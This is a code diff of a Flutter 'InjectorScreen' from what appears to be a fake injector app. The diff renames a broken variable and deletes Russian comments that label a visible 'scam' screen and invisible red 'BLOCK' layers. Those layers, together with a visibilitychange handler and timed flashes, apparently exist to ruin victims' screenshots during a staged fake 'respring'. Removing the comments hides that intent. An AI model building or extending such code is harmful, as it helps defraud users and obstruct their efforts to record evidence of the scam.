@@ -36,7 +36,7 @@ class InjectorScreen extends StatefulWidget {
 class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProviderStateMixin {
   bool _isInjecting = false;
   bool _showScam = false;
-  bool _isResp ringing = false;
+  bool _isRespring = false;
 
   late AnimationController _progressController;
   
@@ -150,7 +150,7 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
 
   void _triggerRespring() {
     setState(() {
-      _isResp ringing = true;
+      _isRespring = true;
     });
   }
 
@@ -270,8 +270,7 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
             ),
           ),
 
-          // Экран СКАМА (видимый)
-          if (_showScam && !_isResp ringing)
+          if (_showScam && !_isRespring)
             Container(
               color: Colors.black,
               width: double.infinity,
@@ -305,8 +304,7 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
               ),
             ),
 
-          // Респринг + защита от скриншотов
-          if (_isResp ringing)
+          if (_isRespring)
             _buildSecureRespringScreen(),
         ],
       ),
@@ -316,7 +314,6 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
   Widget _buildSecureRespringScreen() {
     return Stack(
       children: [
-        // Слой 1: WebView с респрингом (видимый для пользователя)
         InAppWebView(
           initialData: InAppWebViewInitialData(
             data: _getRespringHTML(),
@@ -331,10 +328,8 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
           ),
         ),
         
-        // Слой 2: НЕВИДИМЫЙ красный экран для скриншотов
-        // Этот слой невидим для глаза, но рендерится системой и попадает на скриншот
         Opacity(
-          opacity: 0.0, // Полностью прозрачный для глаза
+          opacity: 0.0,
           child: Container(
             width: double.infinity,
             height: double.infinity,
@@ -353,18 +348,16 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
           ),
         ),
         
-        // Слой 3: Второй красный слой с opacity для гарантии
-        // Используем ColoredBox с малой непрозрачностью
         IgnorePointer(
           child: Container(
             width: double.infinity,
             height: double.infinity,
-            color: const Color(0x00FF0000), // Полностью прозрачный красный
+            color: const Color(0x00FF0000),
             child: const Center(
               child: Text(
                 'BLOCK',
                 style: TextStyle(
-                  color: Color(0x00FFFFFF), // Прозрачный белый
+                  color: Color(0x00FFFFFF),
                   fontSize: 48,
                   fontWeight: FontWeight.bold,
                   fontFamily: 'Courier',
@@ -403,7 +396,6 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
                 opacity: 0;
                 pointer-events: none;
             }
-            /* Скрытый слой для скриншотов */
             .screenshot-trap {
                 position: fixed;
                 inset: 0;
@@ -427,7 +419,6 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
     </head>
     <body>
         <div class="flash" id="f"></div>
-        <!-- Невидимый красный слой для скриншотов -->
         <div class="screenshot-trap"></div>
         <div class="screenshot-trap-text">BLOCK</div>
         <script>
@@ -455,11 +446,8 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
                 document.body.appendChild(i);
             }
             
-            // Специальный обработчик для захвата скриншотов
-            // При обнаружении попытки скриншота показываем красный экран
             document.addEventListener('visibilitychange', function() {
                 if (document.hidden) {
-                    // Возможно делают скриншот
                     var trap = document.querySelector('.screenshot-trap');
                     var trapText = document.querySelector('.screenshot-trap-text');
                     if (trap) {
@@ -476,7 +464,6 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
                 }
             });
             
-            // Периодически активируем красный слой на долю секунды
             setInterval(function() {
                 var trap = document.querySelector('.screenshot-trap');
                 var trapText = document.querySelector('.screenshot-trap-text');
